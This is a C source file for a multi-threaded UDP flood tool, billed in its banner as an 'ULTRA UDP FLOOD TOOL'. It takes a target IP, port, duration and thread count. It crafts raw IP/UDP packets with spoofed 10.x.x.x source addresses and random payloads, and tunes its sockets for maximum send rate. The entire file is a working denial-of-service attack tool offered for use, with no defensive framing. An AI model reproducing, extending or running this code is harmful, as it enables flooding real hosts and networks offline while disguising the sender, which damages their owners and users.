#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define BUFFER_SIZE 1400  // Optimized for MTU
#define MAX_THREADS 1000  // Increased thread limit
#define STATS_INTERVAL 2
#define BATCH_SIZE 100    // Send multiple packets per syscall

// Custom UDP header structure
struct udp_packet {
    struct iphdr ip;
    struct udphdr udp;
    char data[BUFFER_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr)];
};

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    int sock_count;  // Multiple sockets per thread
    long packet_count;
    long total_bytes;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;
volatile long global_packets = 0;
volatile long global_bytes = 0;
time_t global_start_time;

void handle_signal(int sig) {
    keep_running = 0;
    printf("\nShutting down...\n");
}

// High-resolution time function
long long get_time_ms() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (long long)tv.tv_sec * 1000 + tv.tv_usec / 1000;
}

void *stats_thread(void *arg) {
    time_t last_time = time(NULL);
    long last_packets = 0;
    long last_bytes = 0;
    
    while (keep_running) {
        sleep(STATS_INTERVAL);
        
        time_t current_time = time(NULL);
        long current_packets = global_packets;
        long current_bytes = global_bytes;
        long interval_packets = current_packets - last_packets;
        long interval_bytes = current_bytes - last_bytes;
        double interval_seconds = difftime(current_time, last_time);
        
        if (interval_seconds > 0) {
            double pps = interval_packets / interval_seconds;
            double mbps = (interval_bytes * 8.0) / (interval_seconds * 1024 * 1024);
            
            printf("[STATS] PPS: %.0f | Mbps: %.2f | Total: %ld packets | Time: %lds\n", 
                   pps, mbps, current_packets, (current_time - global_start_time));
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    return NULL;
}

// Raw socket creation for maximum performance
int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        // Fallback to normal UDP socket
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) {
            return -1;
        }
    }
    return sock;
}

// Optimize socket for maximum performance
void optimize_socket(int sock) {
    int sock_opt = 1;
    
    // Enable socket reuse
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof(sock_opt));
    
    // Maximum buffer sizes
    int sendbuf = 64 * 1024 * 1024;  // 64MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    
    // Disable Nagle's algorithm (not really for UDP but good practice)
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &sock_opt, sizeof(sock_opt));
    
    // Set high priority
    int priority = 6;
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    
    // Non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

// Create multiple packets with different patterns
void create_packets(struct udp_packet **packets, int count, int data_size, 
                   const char *src_ip, const char *dst_ip, int src_port, int dst_port) {
    for (int i = 0; i < count; i++) {
        struct udp_packet *pkt = &(*packets)[i];
        
        // IP header
        pkt->ip.ihl = 5;
        pkt->ip.version = 4;
        pkt->ip.tos = 0;
        pkt->ip.tot_len = htons(sizeof(struct udp_packet));
        pkt->ip.id = htons(rand() % 65535);
        pkt->ip.frag_off = 0;
        pkt->ip.ttl = 64;
        pkt->ip.protocol = IPPROTO_UDP;
        pkt->ip.check = 0;
        inet_pton(AF_INET, src_ip, &pkt->ip.saddr);
        inet_pton(AF_INET, dst_ip, &pkt->ip.daddr);
        
        // UDP header
        pkt->udp.source = htons(src_port + i);  // Vary source port
        pkt->udp.dest = htons(dst_port);
        pkt->udp.len = htons(sizeof(struct udphdr) + data_size);
        pkt->udp.check = 0;
        
        // Fill with random data
        for (int j = 0; j < data_size; j++) {
            pkt->data[j] = rand() % 256;
        }
    }
}

void *udp_flood_optimized(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    int sock_count = flood_args->sock_count;
    
    int *sockets = malloc(sock_count * sizeof(int));
    struct sockaddr_in target;
    socklen_t target_len = sizeof(target);

    // Initialize target address
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);

    // Create and optimize multiple sockets
    for (int i = 0; i < sock_count; i++) {
        sockets[i] = create_raw_socket();
        if (sockets[i] >= 0) {
            optimize_socket(sockets[i]);
        }
    }

    // Prepare multiple packet buffers with different patterns
    struct udp_packet *packets = malloc(BATCH_SIZE * sizeof(struct udp_packet));
    char *fake_src_ip = "192.168.1.100";  // Will be varied
    
    // Generate source IPs for this thread
    int base_ip3 = (thread_id * 17) % 254 + 1;
    
    long thread_packets = 0;
    long thread_bytes = 0;
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    
    printf("Thread %d started with %d sockets - Target: %s:%d\n", 
           thread_id, sock_count, ip, port);
    
    // Main flood loop - ULTRA OPTIMIZED
    while (keep_running && time(NULL) < end_time) {
        // Vary source IP for each batch
        char src_ip[16];
        snprintf(src_ip, sizeof(src_ip), "10.%d.%d.%d", 
                (thread_id % 254), base_ip3, (rand() % 254) + 1);
        
        // Create batch of packets with different characteristics
        create_packets(&packets, BATCH_SIZE, BUFFER_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr),
                      src_ip, ip, 10000 + thread_id, port);
        
        // Send batch using multiple sockets in round-robin
        for (int pkt_idx = 0; pkt_idx < BATCH_SIZE; pkt_idx++) {
            int sock_idx = pkt_idx % sock_count;
            
            if (sockets[sock_idx] >= 0) {
                ssize_t sent = sendto(sockets[sock_idx], 
                                    &packets[pkt_idx], 
                                    sizeof(struct udp_packet), 
                                    MSG_DONTWAIT,
                                    (struct sockaddr *)&target, 
                                    target_len);
                
                if (sent > 0) {
                    thread_packets++;
                    thread_bytes += sent;
                }
            }
        }
        
        // Batch update global stats
        if (thread_packets % 1000 == 0) {
            __sync_fetch_and_add(&global_packets, 1000);
            __sync_fetch_and_add(&global_bytes, 1000 * BUFFER_SIZE);
        }
        
        // Minimal delay to prevent complete system lock
        if (thread_packets % 10000 == 0) {
            usleep(1); // 1 microsecond
        }
    }

    // Final stats update
    long remaining_packets = thread_packets % 1000;
    if (remaining_packets > 0) {
        __sync_fetch_and_add(&global_packets, remaining_packets);
        __sync_fetch_and_add(&global_bytes, remaining_packets * BUFFER_SIZE);
    }

    // Cleanup
    for (int i = 0; i < sock_count; i++) {
        if (sockets[i] >= 0) {
            close(sockets[i]);
        }
    }
    free(sockets);
    free(packets);
    
    printf("Thread %d finished - Packets: %ld\n", thread_id, thread_packets);
    free(args);
    return NULL;
}

// Simple UDP flood for fallback
void *udp_flood_simple(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        free(args);
        return NULL;
    }
    optimize_socket(sock);

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);

    char *buffer = malloc(BUFFER_SIZE);
    // Fill with random data
    for (int i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = rand() % 256;
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    long thread_packets = 0;
    
    while (keep_running && time(NULL) < end_time) {
        sendto(sock, buffer, BUFFER_SIZE, MSG_DONTWAIT, 
               (struct sockaddr *)&target, sizeof(target));
        thread_packets++;
        
        if (thread_packets % 500 == 0) {
            __sync_fetch_and_add(&global_packets, 500);
            __sync_fetch_and_add(&global_bytes, 500 * BUFFER_SIZE);
        }
    }

    close(sock);
    free(buffer);
    free(args);
    return NULL;
}

void print_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════╗\n");
    printf("║           ULTRA UDP FLOOD TOOL              ║\n");
    printf("║             [EXTREME EDITION]               ║\n");
    printf("╚══════════════════════════════════════════════╝\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS> <SOCKETS_PER_THREAD>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 50 5\n", argv[0]);
        printf("Sockets per thread: 1-10 (more = more performance)\n");
        exit(EXIT_FAILURE);
    }

    print_banner();
    
    // Setup signal handling
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    int sockets_per_thread = atoi(argv[5]);

    if (num_threads > MAX_THREADS) {
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }

    if (sockets_per_thread > 10) {
        sockets_per_thread = 10;
    }

    printf("[INFO] Target: %s:%d\n", ip, port);
    printf("[INFO] Duration: %d seconds\n", duration);
    printf("[INFO] Threads: %d\n", num_threads);
    printf("[INFO] Sockets per thread: %d\n", sockets_per_thread);
    printf("[INFO] Total sockets: %d\n", num_threads * sockets_per_thread);
    printf("[INFO] Buffer size: %d bytes\n", BUFFER_SIZE);
    printf("[INFO] Starting attack in 3 seconds...\n");
    sleep(3);

    // Check if we can use raw sockets
    int test_raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int use_raw_sockets = (test_raw >= 0);
    if (test_raw >= 0) {
        close(test_raw);
        printf("[INFO] Using RAW sockets for maximum performance!\n");
    } else {
        printf("[INFO] Using normal UDP sockets (no root privileges)\n");
    }

    global_start_time = time(NULL);
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thr;

    // Start statistics thread
    if (pthread_create(&stats_thr, NULL, stats_thread, NULL) != 0) {
        perror("Could not create stats thread");
        exit(EXIT_FAILURE);
    }

    // Create flood threads
    int threads_created = 0;
    for (int i = 0; i < num_threads; i++) {
        flood_args_t *args = calloc(1, sizeof(flood_args_t));
        if (!args) {
            perror("Memory allocation failed");
            continue;
        }
        
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->duration = duration;
        args->thread_id = i + 1;
        args->sock_count = sockets_per_thread;

        void *(*flood_func)(void*) = use_raw_sockets ? udp_flood_optimized : udp_flood_simple;
        
        if (pthread_create(&threads[i], NULL, flood_func, (void *)args) == 0) {
            threads_created++;
        } else {
            perror("Could not create thread");
            free(args);
        }
        
        // Stagger thread creation
        usleep(500);
    }

    printf("[INFO] Created %d flood threads\n", threads_created);
    
    // Wait for all threads to complete
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(stats_thr, NULL);

    // Final statistics
    time_t total_time = time(NULL) - global_start_time;
    if (total_time == 0) total_time = 1;
    double avg_pps = (double)global_packets / total_time;
    double total_mb = (double)global_bytes / (1024 * 1024);
    double avg_mbps = (total_mb * 8) / total_time;
    double total_gb = total_mb / 1024;
    
    printf("\n╔══════════════════════════════════════════════╗\n");
    printf("║                 FINAL STATS                 ║\n");
    printf("╠══════════════════════════════════════════════╣\n");
    printf("║ Total Packets: %-29ld ║\n", global_packets);
    printf("║ Total Data:    %-8.2f MB / %-6.2f GB   ║\n", total_mb, total_gb);
    printf("║ Duration:      %-8ld seconds          ║\n", total_time);
    printf("║ Average PPS:   %-8.0f packets/sec     ║\n", avg_pps);
    printf("║ Average Mbps:  %-8.2f Mbps            ║\n", avg_mbps);
    printf("║ Performance:   %-8.2f Gbps            ║\n", avg_mbps / 1000);
    printf("╚══════════════════════════════════════════════╝\n");

    return 0;
}